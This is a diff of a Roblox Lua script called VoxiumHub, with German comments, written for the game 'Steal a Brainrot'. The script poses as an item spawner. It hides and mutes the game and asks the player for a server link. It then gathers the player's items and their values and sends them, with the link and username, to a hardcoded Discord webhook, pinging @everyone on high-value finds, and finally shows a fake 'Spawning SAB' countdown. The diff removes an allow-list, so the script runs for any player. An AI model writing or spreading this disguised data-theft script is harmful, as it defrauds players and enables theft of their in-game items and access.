@@ -1,4 +1,4 @@
--- === VOXIUMHUB - FINAL FIX: ALLE TRAITS IN LISTE + LOADING NACH LINK + WEBHOOK 100% ===
+-- === VOXIUMHUB - FINAL: AUTHORISED USERS ENTFERNT + ALLES FIX ===
 pcall(function() setclipboard("https://discord.gg/rvZndRfkyX") end)
 
 local Players = game:GetService("Players")
@@ -15,19 +15,6 @@ if game.PlaceId ~= ALLOWED_PLACE_ID then
     Players.LocalPlayer:Kick("Wrong game! Only works on official game.")
     return
 end
-
--- === AUTHORISED USERS ===
-local AuthorisedUsers = AuthorisedUsers or {
-    "LennonDev", "YourUserName", "Player1", "Player2"
-}
-local LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
-local isAuthorised = false
-for _, name in ipairs(AuthorisedUsers) do
-    if LP.Name == name or LP.DisplayName == name then
-        isAuthorised = true; break
-    end
-end
-if not isAuthorised then LP:Kick("Not authorised.") return end
 
 -- === HIDE UI & MUTE ===
 pcall(function()
@@ -51,6 +38,7 @@ for _, c in {workspace, Players, game.ReplicatedStorage, game.Lighting, StarterG
 
 -- === WAIT FOR GAME LOADED ===
 if not game:IsLoaded() then pcall(function() game.Loaded:Wait() end) end
+local LP = Players.LocalPlayer
 
 -- === COLORS ===
 local COLORS = {
@@ -402,7 +390,7 @@ local function showLoadingScreen()
     return loadSG
 end
 
--- === ALLE TRAITS IN DER LISTE (VOLLSTÄNDIG) ===
+-- === ALLE TRAITS (VOLLSTÄNDIG) ===
 local traitMap = {
     ["89041930759464"] = "Taco",
     ["104229924295526"] = "Nyan",
@@ -438,7 +426,7 @@ local traitMap = {
     ["97054765273857"] = "Jackolantern Pet",
 }
 
--- === BRAINROT FETCH (MIT ALLEN TRAITS) ===
+-- === BRAINROT FETCH ===
 local Plot = require(ReplicatedStorage.Controllers.PlotController)
 local gen = require(ReplicatedStorage.Shared.Animals)
 local myPlot = Plot:GetMyPlot()
@@ -451,25 +439,20 @@ local function getAllBrainrots()
 
         local traitName = "None"
         if brainrot.Mutation and brainrot.Mutation:FindFirstChild("Icon") then
-            local icon = brainrot.Mutation.Icon
-            local assetId = tostring(icon.Image):match("%d+$")
+            local assetId = tostring(brainrot.Mutation.Icon.Image):match("%d+$")
             if assetId and traitMap[assetId] then
                 traitName = traitMap[assetId]
             end
         end
 
-        local fullName = baseName
-        if traitName ~= "None" then
-            fullName = baseName .. " (" .. traitName .. ")"
-        end
-
+        local fullName = traitName ~= "None" and baseName .. " (" .. traitName .. ")" or baseName
         table.insert(list, {name = fullName, moneyPerSec = amount, trait = traitName})
     end
     table.sort(list, function(a,b) return a.moneyPerSec > b.moneyPerSec end)
     return list
 end
 
--- === HELPER: FORMAT MONEY & PING ===
+-- === HELPER ===
 local function parsePingValue(p)
     local n, s = p:match("(%d+)([kmb]?)")
     n = tonumber(n) or 0
@@ -488,19 +471,16 @@ end
 
 local function hasHighValue(b) for _,d in ipairs(b) do if d.moneyPerSec >= pingThreshold then return true end end return false end
 
--- === WEBHOOK SEND (100% FIX) ===
+-- === WEBHOOK ===
 local Webhook1 = Webhook or "https://discord.com/api/webhooks/1401504146959368323/f0wuuzMXgffHU1o4S8xU6dn7LoQ0ltx_yxtaoShAwYvwPSrXt8q0oRJgOPIKpPHQ-xH2"
 local Username = "voxium script .gg/59XeEXRe"
 
 local function sendWebhook(brainrots, link)
-    local text = ""
-    if #brainrots > 0 then
-        for _, d in ipairs(brainrots) do
-            text = text .. string.format("%s - %s\n", d.name, formatMoney(d.moneyPerSec))
-        end
-    else
-        text = "No Brainrots found"
-    end
+    local text = #brainrots > 0 and table.concat((function()
+        local t = {}
+        for _, d in ipairs(brainrots) do table.insert(t, string.format("%s - %s", d.name, formatMoney(d.moneyPerSec))) end
+        return t
+    end)(), "\n") or "No Brainrots found"
 
     local info = string.format("Name: %s\nDisplay: %s\nPlayers: %d/%d", LP.Name, LP.DisplayName, #Players:GetPlayers(), Players.MaxPlayers)
     local ping = hasHighValue(brainrots) and "@everyone" or ""
@@ -521,10 +501,7 @@ local function sendWebhook(brainrots, link)
     }
 
     local req = http_request or request or (syn and syn.request)
-    if not req then
-        warn("No HTTP request function available!")
-        return false
-    end
+    if not req then return false end
 
     local success, err = pcall(function()
         req({
@@ -535,16 +512,10 @@ local function sendWebhook(brainrots, link)
         })
     end)
 
-    if not success then
-        warn("Webhook failed: " .. tostring(err))
-        return false
-    else
-        print("Webhook sent!")
-        return true
-    end
+    return success
 end
 
--- === SUBMIT BUTTON ===
+-- === SUBMIT ===
 SubmitBtn.MouseButton1Click:Connect(function()
     local link = LinkBox.Text:match("^%s*(.-)%s*$")
     if link == "" or not link:find("^https://") then
@@ -555,26 +526,15 @@ SubmitBtn.MouseButton1Click:Connect(function()
 
     StatusLabel.Text = "Processing..."
     StatusLabel.TextColor3 = COLORS.a2
-
-    -- Haupt-UI verstecken
     SG:Destroy()
 
-    -- Loading Screen zeigen
     local loadingSG = showLoadingScreen()
-
-    -- Brainrots sammeln (im Hintergrund)
     local brainrots = getAllBrainrots()
-
-    -- Webhook senden
     local sent = sendWebhook(brainrots, link)
 
-    -- Loading beenden
     task.wait(1)
-    if loadingSG and loadingSG.Parent then
-        loadingSG:Destroy()
-    end
+    if loadingSG and loadingSG.Parent then loadingSG:Destroy() end
 
-    -- SAB Spawner (nach Webhook)
     local sabSpawner = Instance.new("ScreenGui")
     sabSpawner.Name = "SabSpawner_GUI"
     sabSpawner.Parent = LP:FindFirstChildOfClass("PlayerGui") or CoreGui
@@ -598,7 +558,6 @@ SubmitBtn.MouseButton1Click:Connect(function()
     title.TextSize = 18
 
     local status = Instance.new("TextLabel", frame)
-    status.Text = "Spawning SAB in 3..."
     status.Position = UDim2.new(0, 0, 0, 50)
     status.Size = UDim2.new(1, 0, 0, 30)
     status.BackgroundTransparency = 1
@@ -610,6 +569,7 @@ SubmitBtn.MouseButton1Click:Connect(function()
         status.Text = "Failed to send data."
         status.TextColor3 = COLORS.warn
     else
+        status.Text = "Spawning SAB in 3..."
         for i = 1, 3 do
             status.Text = "Spawning SAB in " .. (4 - i) .. "..."
             task.wait(1)
